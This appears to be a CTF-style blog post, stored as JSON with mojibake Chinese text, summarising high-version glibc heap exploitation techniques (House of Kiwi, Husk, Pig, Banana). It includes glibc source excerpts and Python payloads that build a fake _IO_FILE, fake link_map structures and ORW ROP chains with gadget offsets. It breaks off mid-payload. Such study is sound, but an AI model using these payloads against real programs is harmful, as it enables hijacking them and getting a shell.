[{"title":"é«˜ç‰ˆæœ¬å„ç±»å †æŠ€å·§æ€»ç»“","url":"/2021/08/20/é«˜ç‰ˆæœ¬å †å„ç±»æŠ€å·§æ€»ç»“/","content":"\n# ä¸€ã€House of KIWI\n\n[House OF Kiwi - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/235598)\n\n## 1.åŸç†åˆ†æ\n\nå‡½æ•°è°ƒç”¨é“¾ï¼š**assert->malloc_assert->fflush->_IO_file_jumpsç»“æ„ä½“ä¸­çš„__IO_file_sync**\n\nè°ƒç”¨æ—¶çš„å¯„å­˜å™¨ä¸ºï¼š\n\n![å›¾ç‰‡2](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png)\n\né‚£ä¹ˆå¦‚æœå¯ä»¥åœ¨ä¸åŒç‰ˆæœ¬ä¸‹åŠ«æŒå¯¹åº”setcontextä¸­çš„èµ‹å€¼å‚æ•°ï¼Œå³rdiæˆ–è€…rdxï¼Œå°±å¯ä»¥è®¾ç½®å¯„å­˜å™¨æ¥è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°ã€‚\n\n### (1)rdiå’Œrdxäº’ç›¸è½¬æ¢\n\nâ‘ getkeyserv_handle+576ï¼š\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\né€šè¿‡rdiæ§åˆ¶rdxï¼ŒåŒæ ·2.29ä»¥åä¸åŒç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦å†è°ƒè¯•çœ‹çœ‹ï¼Œæ¯”å¦‚2.31é‡Œå°±æ˜¯ï¼š\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\nâ‘¡svcudp_reply+26:\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\né€šè¿‡rdiæ§åˆ¶rbpå®ç°æ ˆè¿ç§»ï¼Œç„¶åå³å¯ä»»æ„gadgetäº†ã€‚\n\nå…¶ä¸­2.31ç‰ˆæœ¬ä¸‹è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¦‚ä¸‹ï¼š\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\n### (2)ä¸åŒåŠ«æŒ\n\nè¿™é‡Œè§‚å¯Ÿå¯„å­˜å™¨å°±å¯ä»¥çŸ¥é“ï¼Œä¸åŒç‰ˆæœ¬çš„setcontextå¯¹åº”çš„rdiå’Œrdxï¼Œè¿™é‡Œå°±åŠ«æŒå“ªä¸€ä¸ªã€‚å¦å¤–è¿™é‡Œçš„rdiä¸º_IO_2_1_stderrç»“æ„ä½“ï¼Œæ˜¯ä»stderr@@GLIBC_2.2.5å–å€¼è¿‡æ¥çš„ï¼Œä¹Ÿå°±æ˜¯dataæ®µä¸Šçš„æ•°æ®ï¼Œå¦‚æœå¯ä»¥å–å¾—ELFåŸºåœ°å€ï¼Œç›´æ¥åŠ«æŒè¯¥æŒ‡é’ˆä¸ºchunkåœ°å€ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™æ ·å°±èƒ½åŠ«æŒRDIå¯„å­˜å™¨äº†ã€‚\n\n![å›¾ç‰‡1](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827165944.png)\n\nè¿™æ ·å¦‚æœåŠ«æŒ__IO_file_syncå‡½æ•°æŒ‡é’ˆä¸ºsetcontextï¼Œé…åˆåŠ«æŒçš„rdiå’Œrdxå°±å¯ä»¥æ¥è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨å‡½æ•°ä»è€Œç›´æ¥getshellæˆ–è€…ç»•è¿‡orwã€‚\n\n## 2.è§¦å‘æ¡ä»¶\n\nåªè¦assertåˆ¤æ–­å‡ºé”™éƒ½å¯ä»¥ï¼Œå¸¸ç”¨ä»¥ä¸‹å‡ ä¸ª\n\n(1)top_chunkæ”¹å°ï¼Œå¹¶ç½®pre_inuseä¸º0ï¼Œå½“top_chunkä¸è¶³åˆ†é…æ—¶ä¼šè§¦å‘ä¸€ä¸ªassertã€‚(è¯¥assertå‡½æ•°åœ¨sysmallocå‡½æ•°ä¸­è¢«è°ƒç”¨)\n\n![Snipaste_2021-08-28_11-56-34](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828115642.png)\n\n**(2)largebin chunkçš„sizeä¸­çš„flagä½ï¼Œè¿™ä¸ªä¸å¤ªæ¸…æ¥š....**\n\n(3)å¦‚æœæ˜¯2.29åŠä»¥ä¸‹ï¼Œå› ä¸ºåœ¨tcache_putå’Œtcache_getä¸­è¿˜å­˜åœ¨assertçš„å…³ç³»ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥ä¿®æ”¹æ‰mp_.tcache_binsï¼Œå°†ä¹‹æ”¹å¤§ï¼Œ(åˆ©ç”¨largebin attack)å°±ä¼šè§¦å‘assert\n\n```c\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\n![Snipaste_2021-08-28_11-46-59](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828114858.png)\n\n\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nå¦‚æœå°†`exit`å‡½æ•°æ›¿æ¢æˆ`_exit`å‡½æ•°,æœ€ç»ˆç»“æŸçš„æ—¶å€™,åˆ™æ˜¯è¿›è¡Œäº†syscallæ¥ç»“æŸ,å¹¶æ²¡æœ‰æœºä¼šè°ƒç”¨`_IO_cleanup`,è‹¥å†å°†`__malloc_hook`å’Œ`__free_hook`ç»™banäº†,ä¸”åœ¨è¾“å…¥å’Œè¾“å‡ºéƒ½ç”¨readå’Œwriteçš„æƒ…å†µä¸‹,æ— æ³•hookä¸”æ— æ³•é€šè¿‡IOåˆ·æ–°ç¼“å†²åŒºçš„æƒ…å†µä¸‹ã€‚è¿™æ—¶å€™å¯ä»¥å€Ÿç”¨mallocå‡ºé”™è°ƒç”¨**malloc_assert->fflush->_IO_file_sync**å‡½æ•°æŒ‡é’ˆã€‚ä¸”è¿›å…¥çš„æ—¶å€™rdxä¸º`_IO_helper_jumps_addr`ï¼Œrdiä¸º`_IO_2_1_stderr_addr`ã€‚\n\n\n\n# äºŒã€House of Husk\n\n[house-of-huskå­¦ä¹ ç¬”è®° (juejin.cn)](https://juejin.cn/post/6844904117119385614)\n\n## **1**.åŸç†åˆ†æ\n\nå‡½æ•°è°ƒç”¨é“¾:\n\n```c\nprintf->vfprintf->printf_positional->__parse_one_specmb->__printf_arginfo_table(spec)\n\t\t\t\t\t\t\t\t\t\t\t\t|\n    \t\t\t\t\t\t\t\t\t\t\t ->__printf_function_table(spec)\n```\n\n**__parse_one_specmb** å‡½æ•° ä¼šè°ƒç”¨ **__printf_arginfo_table**å’Œ**__printf_function_table**ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆä¸­å¯¹åº”specç´¢å¼•çš„å‡½æ•°æŒ‡é’ˆ**printf_arginfo_size_function**\n\nâ–²è¿™ä¸ªspecç´¢å¼•æŒ‡é’ˆå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦çš„asciiç å€¼ï¼Œæ¯”å¦‚printf(\"%S\")ï¼Œé‚£ä¹ˆå°±æ˜¯Sçš„asciiç å€¼ã€‚å½“ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•çš„å‰ææ˜¯å¾—æœ‰printfç³»åˆ—å‡½æ•°ï¼Œå¹¶ä¸”æœ‰æ ¼å¼åŒ–å­—ç¬¦ã€‚\n\nå³è°ƒç”¨**(*__printf_arginfo_table+'spec'8) å’Œ  (*printf_function_table+'spec'8)**è¿™ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆã€‚\n\nè€Œå®é™…æƒ…å†µä¼šå…ˆè°ƒç”¨**__printf_arginfo_table**ä¸­å¯¹åº”çš„specç´¢å¼•çš„å‡½æ•°æŒ‡é’ˆï¼Œç„¶åè°ƒç”¨**__printf_function_table**å¯¹åº”specç´¢å¼•å‡½æ•°æŒ‡é’ˆã€‚\n\næ‰€ä»¥å¦‚æœä¿®æ”¹äº†**__printf_arginfo_table**å’Œ**__printf_function_table**ï¼Œåˆ™éœ€è¦ç¡®ä¿å¯¹åº”çš„specç´¢å¼•å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œè¦ä¹ˆä¸º0ï¼Œè¦ä¹ˆæœ‰æ•ˆã€‚\n\nåŒæ—¶å¦‚æœé€‰æ‹©è¿™ä¸ªæ–¹æ³•ï¼Œå°±å¾—éœ€è¦**__printf_arginfo_table**å’Œ**__printf_function_table**å‡ä¸ä¸º0æ‰è¡Œã€‚\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n/* Use the slow path in case any printf handler is registered.  */\nif (__glibc_unlikely (__printf_function_table != NULL\n                      || __printf_modifier_table != NULL\n                      || __printf_va_arg_table != NULL))\n    goto do_positional;\n\n\ndo_positional:\nif (__glibc_unlikely (workstart != NULL))\n{\n    free (workstart);\n    workstart = NULL;\n}\ndone = printf_positional (s, format, readonly_format, ap, &ap_save,\n                          done, nspecs_done, lead_str_end, work_buffer,\n                          save_errno, grouping, thousands_sep, mode_flags);\n```\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n(void) (*__printf_arginfo_table[specs[cnt].info.spec])\n(&specs[cnt].info,\n specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n &args_size[specs[cnt].data_arg]);\n\n\n/* Call the function.  */\nfunction_done = __printf_function_table[(size_t) spec]\n    (s, &specs[nspecs_done].info, ptr);\n```\n\nå³å¦‚æœtableä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨`printf_positional`å‡½æ•°ï¼Œç„¶åå¦‚æœspecä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨å¯¹åº”specç´¢å¼•å‡½æ•°ã€‚ä½†æ˜¯æœ‰æ—¶å€™ä¸çŸ¥é“printfæœ€ç»ˆä¼šè°ƒç”¨å“ªä¸ªspecï¼Œå¯èƒ½éšè—åœ¨å“ªï¼Œæ‰€ä»¥ç›´æ¥æŠŠå¹²è„†`_printf_arginfo_table`å’Œ`__printf_function_table`ä¸­çš„å€¼å…¨ç»™æ”¹æˆone_gadgetç®—äº†ã€‚\n\nâ–²ç»¼ä¸Šï¼Œå¾—å‡ºä»¥ä¸‹æ¡ä»¶ï¼š\n\n```C\nA.\t__printf_function_table = heap_addr \n\t__printf_arginfo_table != 0\n//å…¶ä¸­__printf_arginfo_tableå’Œ__printf_function_tableå¯ä»¥å¯¹è°ƒ\nB. heap_addr+'spec'*8 = one_gadget\n```\n\n![å›¾ç‰‡1](https://i.loli.net/2021/08/20/23CGNn46r5xEgJy.png)\n\nåœ¨2.29ä¸‹å¯ä»¥ç›´æ¥ç”¨largebin attackçˆ†ç ´ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼Œå½“ç„¶è¿˜æ˜¯éœ€è¦å…ˆæ³„éœ²åœ°å€çš„ã€‚\n\n## 2.è§¦å‘æ¡ä»¶\n\nå³éœ€è¦printfå®¶æ—å‡½æ•°è¢«è°ƒç”¨ï¼Œä¸”å…¶ä¸­éœ€å¸¦ä¸Šæ ¼å¼åŒ–å­—ç¬¦ï¼Œæ¯”å¦‚%sï¼Œ%xç­‰ï¼Œç”¨æ¥è®¡ç®—specï¼Œè¿™ä¸ªå’Œlibcç‰ˆæœ¬æ— å…³ï¼Œç›¸å½“äºåªé’ˆå¯¹printfå®¶æ—å‡½æ•°è¿›è¡Œæ”»å‡»çš„ã€‚\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nå…·æœ‰printfå®¶æ—å‡½æ•°ï¼Œå¹¶ä¸”å­˜åœ¨specï¼Œåˆé€‚åœ°æ–¹ä¼šè°ƒç”¨ã€‚\n\n\n\n# ä¸‰ã€House of Pig\n\n[house of pigä¸€ä¸ªæ–°çš„å †åˆ©ç”¨è¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n## 1.åŸç†åˆ†æ\n\n### (1)åŠ«æŒåŸç†\n\n**_IO_str_overflow**å‡½æ•°ä¸­ä¼šè¿ç»­è°ƒç”¨**malloc memcpy free**ä¸‰ä¸ªå‡½æ•°ã€‚å¹¶ä¸”**__IO_str_overflow**å‡½æ•°ä¼ å…¥çš„å‚æ•°rdiä¸ºä»**_IO_list_all**ä¸­è·å–çš„**_IO_2_1_stderr**ç»“æ„ä½“çš„åœ°å€ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½æ”¹æ‰**_IO_list_all**ä¸­çš„å€¼å°±èƒ½åŠ«æŒè¿›å…¥è¯¥å‡½æ•°çš„å‚æ•°`rdi`ã€‚\n\n![Snipaste_2021-08-28_17-15-06](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828171517.png)\n\næ‰€ä»¥å¦‚ä¸Šæ‰€ç¤ºï¼Œå³åŠ«æŒæˆåŠŸã€‚\n\n### (2)GetshellåŸç†\n\n#### â‘ å‡½æ•°æµç¨‹\n\nA.åœ¨`_IO_str_overflow`å‡½æ•°ä¸­ä¼šå…ˆç”³è¯·chunkä¸º`new_buf`ï¼Œç„¶åä¼šä¾æ®`rdi`çš„å€¼ï¼Œå°†`rdi`å½“ä½œ`_IO_FILE`ç»“æ„ä½“ï¼Œä»è¯¥ç»“æ„ä½“ä¸­è·å–`_IO_buf_base`å½“ä½œ`old_buf`ã€‚\n\nB.ä¾æ®`old_blen` å’Œ`_IO_buf_base`æ¥æ‹·è´æ•°æ®åˆ°`new_buf`ä¸­ï¼Œç„¶åé‡Šæ”¾æ‰`old_buf`ã€‚å…¶ä¸­`old_blen` æ˜¯é€šè¿‡`_IO_buf_end`å‡å»`_IO_buf_base`å¾—åˆ°çš„ã€‚\n\n```c\n//2.31 strops.cä¸­çš„_IO_str_overflow\nif (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n    return EOF;\nelse\n{\n    char *new_buf;\n    char *old_buf = fp->_IO_buf_base;\n    size_t old_blen = _IO_blen (fp);\n    size_t new_size = 2 * old_blen + 100;\n    if (new_size < old_blen)\n        return EOF;\n    new_buf = malloc (new_size);//-------house of pig:get chunk from tcache\n    if (new_buf == NULL)\n    {\n        /*\t  __ferror(fp) = 1; */\n        return EOF;\n    }\n    if (old_buf)\n    {\n        memcpy (new_buf, old_buf, old_blen);\n        //-------house of pig:copy /bin/sh and system to _free_hook\n        free (old_buf);\t\t//-------house of pig:getshell\n        /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n        fp->_IO_buf_base = NULL;\n    }\n```\n\n\n\n![Snipaste_2021-08-28_17-30-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828173049.png)\n\n#### â‘¡åŠ«æŒæ‰€éœ€æ•°æ®\n\næ‰€ä»¥å¦‚æœåœ¨ç”³è¯·çš„`new_buf`åŒ…å«ä¸º`_free_hook`ï¼Œç„¶åæˆ‘ä»¬åœ¨`_IO_buf_base`å’Œ`_IO_buf_end`è¿™é‡Œä¸€æ®µæ•°æ®å—ä¸­å°†`system_addr`æ”¾å…¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†`system_addr`æ‹·è´åˆ°`_free_hook`ä¸­ã€‚ä¹‹åé‡Šæ”¾æ‰`old_buf`ï¼Œå¦‚æœ`old_buf`ä¸­çš„å¤´éƒ¨æ•°æ®ä¸º`/bin/sh\\x00`ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥**getshell**äº†ã€‚å¾—åˆ°ä»¥ä¸‹åŠ«æŒæ‰€éœ€æ•°æ®ï¼š\n\n```c\n*(_IO_list_all) = chunk_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_base = chunk_sh_sys_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_end = chunk_sh_sys_addr+old_blen;\n//2 * old_blen + 100 é€šå¸¸æˆ‘ä»¬é€‰å–old_blenä¸º0x18ï¼Œé‚£ä¹ˆè®¡ç®—å¾—åˆ°çš„tc_idxä¸º8\ntcachebin[tc_idx] = _free_hook_addr-old_blen;\n```\n\nä½†æ˜¯å¦‚ä½•ä½¿å¾—tcachebin[tc_idx]ä¸­çš„Chunkä¸º`_free_hook_addr-old_blen`å‘¢ï¼Œè¿™ä¸ªå°±ç”¨åˆ°æŠ€æœ¯\n\n`Largebin attack + Tcache Stashing Unlink Attack`ï¼Œè¿™ä¸ªæŠ€æœ¯åŸç†æ¯”è¾ƒå¤æ‚ï¼Œè‡ªå·±çœ‹å§ã€‚\n\n**é€šå¸¸æ˜¯åªèƒ½ä½¿ç”¨calloçš„æƒ…å†µä¸‹æ¥ç”¨çš„ï¼Œå› ä¸ºå¦‚æœèƒ½mallocé‚£ç›´æ¥ä»tcacheä¸­mallocå‡ºæ¥ä¸å°±å®Œäº†ã€‚**\n\nç„¶åç”±äº`_IO_str_overflow`å‡½æ•°ä¸­çš„ä¸€äº›æ£€æŸ¥ï¼Œæ‰€ä»¥æœ‰çš„åœ°æ–¹è¿˜æ˜¯éœ€è¦ä¿®æ”¹çš„ï¼š\n\n```python\nfake_IO_FILE = p64(0)*2\nfake_IO_FILE += p64(1)                     #change _IO_write_base = 1\nfake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff\nfake_IO_FILE += p64(0)\n#need copy '/bin/sh' and system from a old_buf to new_buf\nfake_IO_FILE += p64(heap_base+0x003900+0x10)       #set _IO_buf_base (old_buf(start))\nfake_IO_FILE += p64(heap_base+0x003900+0x10+0x18)  #set _IO_buf_end  (old_buf(end))   \n#old_blen=old_buf(start)-old_buf(end)\nfake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\\x00')\nfake_IO_FILE += p64(0)                    #change _mode = 0\nfake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\\x00')\nfake_IO_FILE += p64(IO_str_vtable)        #change vtable to _IO_str_jumps\n```\n\n## 2.è§¦å‘æ¡ä»¶\n\n(1)Libcç»“æ„è¢«ç ´åçš„abortå‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ·æ–°\n(2)è°ƒç”¨exit()\n(3)èƒ½å¤Ÿä»mainå‡½æ•°è¿”å›\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nç¨‹åºåªèƒ½é€šè¿‡callocæ¥è·å–chunkæ—¶\n\n\n\n# å››ã€House of banana\n\n[house of banana - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\n[main_arenaåŠ«æŒåŠlink_mapåŠ«æŒ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/211331)\n\n## 1.åŸç†åˆ†æ\n\nå‡½æ•°è°ƒç”¨é“¾ï¼š**exit()->_dl_fini->(fini_t)array[i]**\n\n```c\n//2.31 glibc/elf/dl_fini.c\n\n/* First see whether an array is given.  */\nif (l->l_info[DT_FINI_ARRAY] != NULL)\n{\n    ElfW(Addr) *array =\n        (ElfW(Addr) *) (l->l_addr\n                        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);\n    unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val\n                      / sizeof (ElfW(Addr)));\n    while (i-- > 0)\n        ((fini_t) array[i]) ();\n}\n```\n\næ‰€ä»¥å¦‚æœå¯ä»¥ä½¿å¾—*array[i] = one_gadgetï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¸€é”®getshellã€‚è€Œarray[i]è°ƒç”¨æ—¶è¿™é‡Œå°±æœ‰ä¸¤ç§å¥—è·¯ï¼š\n\n### (1)ä¼ªé€ link_mapç»“æ„ä½“\n\nç›´æ¥ä¼ªé€ `link_map`ç»“æ„ä½“ï¼Œå°†åŸæœ¬æŒ‡å‘`link_map`çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„`link_map`ï¼Œç„¶åä¼ªé€ å…¶ä¸­æ•°æ®ï¼Œç»•è¿‡æ£€æŸ¥ï¼Œæœ€åè°ƒç”¨array[i]ã€‚è¿™é‡Œé€šå¸¸åˆ©ç”¨largebin attackæ¥å°†å †åœ°å€å†™åˆ°`_rtld_global`è¿™ä¸ªç»“æ„ä½“æŒ‡é’ˆä¸­ã€‚\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830185253.png)\n\n`link_map`çš„å¸ƒå±€é€šå¸¸å¦‚ä¸‹ï¼š\n\n```python\n#largebin attack's chunk\n#*_rtld_local=fake_link_map_chunk_addr\nfake_link_map_chunk_addr = heap_base+0x001000\nedit(1,0x448,'\\x00'*0x448)  #empty the fake_link_map_chunk\nfake_link_map_data = \"\"\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x20)\t\t#0 1\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr)\t\t\t#2 3\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x28)\t\t#4 5\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x50) + p64(fake_link_map_chunk_addr + 0x20)\t\t\t\t\t\t\t\t\t \n#6 7\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x28) + p64(0x0)\t\t#8 9\nfake_link_map_data += p64(0) + p64(0x0)\t\t\t\t\t\t\t\t\t#10 11\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x50)\t\t#12 13\nfake_link_map_data =  fake_link_map_data.ljust(0x100,'\\x00')\n\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x190) + p64(0)\t\t\t\n#0x20 0x21\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x128) + p64(0)\t\t\n#0x22 0x23\nfake_link_map_data += p64(0x8) + p64(0)\t\t\t\t\t\t\t\t\t#0x24 0x25\nfake_link_map_data =  fake_link_map_data.ljust(0x180,'\\x00')\n\nfake_link_map_data += p64(0x1A) + p64(0x0)\t\t\t\t\t\t\t\t#0x30 0x31\nfake_link_map_data += p64(elf_base + elf.sym['backdoor']) + p64(0)\t\t#0x32 0x33\n\n#set fake_chunk->pre_size\nedit(0,0xd68,'\\x00'*0xd60+p64(fake_link_map_chunk_addr + 0x1a0))\nfake_link_map_data = fake_link_map_data.ljust(0x308,'\\x00')\nfake_link_map_data += p64(0x800000000)\n```\n\n![Snipaste_2021-08-29_09-49-17](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830212809.png)\n\n### (2)ä¿®æ”¹link_mapç»“æ„ä½“æ•°æ®\n\nä¿®æ”¹å¯¹åº”link_mapç»“æ„ä½“ä¸­çš„æ•°æ®ï¼Œç»•è¿‡æ£€æŸ¥ï¼Œæœ€ç»ˆè°ƒç”¨array[i]ã€‚è¿™é‡Œå°±é€šå¸¸éœ€è¦åˆ©ç”¨ä»»æ„ç”³è¯·æ¥ç”³è¯·åˆ°è¯¥ç»“æ„ä½“ï¼Œç„¶åä¿®æ”¹å…¶ä¸­çš„å€¼ï¼Œå› ä¸ºå½“è°ƒç”¨array[i]æ—¶ï¼Œä¼ å…¥çš„å®é™…ä¸Šæ˜¯link_mapä¸­çš„æŸä¸ªåœ°å€ï¼Œå³rdxä¸ºlink_map+0x30ï¼Œè¿™ä¸ªä¸åŒç‰ˆæœ¬å¥½åƒä¸å¤ªä¸€æ ·ï¼Œ2.31åŠä»¥ä¸Šä¸ºlink_map+0x38ã€‚\n\nä¸»è¦ä¼ªé€ ä»¥ä¸‹æ•°æ®ï¼š\n\n![Snipaste_2021-08-30_18-56-38](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830191318.png)\n\nè¿™ä¸ªæ–¹æ³•å¸¸ç”¨æ¥æ‰“ORWï¼Œå› ä¸ºå¯ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ROPé“¾å¸ƒç½®åœ¨link_mapä¸­ã€‚ç„¶è€Œå› ä¸ºç‰ˆæœ¬é—´çš„å…³ç³»ï¼Œæ‰€ä»¥æ•°æ®ä¹Ÿæœ‰ç‚¹ä¸åŒï¼Œå®é™…å¸ƒå±€ï¼š\n\n#### 2.31\n\n![Snipaste_2021-08-30_18-49-43](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830184953.png)\n\n```python\n//docker 2.31 gadget\npop_rdi_ret = libc_base + 0x0000000000026b72;\npop_rsi_ret = libc_base + 0x0000000000027529;\npop_rax_ret = libc_base + 0x000000000004a550;\nsyscall_ret = libc_base + 0x0000000000066229;\npop_rdx_r10_ret = libc_base + 0x000000000011c371\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5b0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+61) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(0x0) + p64(fake_rsp)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(ret) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\n\n\n#### 2.29\n\n![Snipaste_2021-08-30_16-16-41](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830161702.png)\n\n```python\n//docker 2.29 gadget\npop_rdi_ret = libc_base + 0x0000000000026542;\npop_rsi_ret = libc_base + 0x0000000000026f9e;\npop_rax_ret = libc_base + 0x0000000000047cf8;\nsyscall_ret = libc_base + 0x00000000000cf6c5;\npop_rdx_r10_ret = libc_base + 0x000000000012bda4\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + 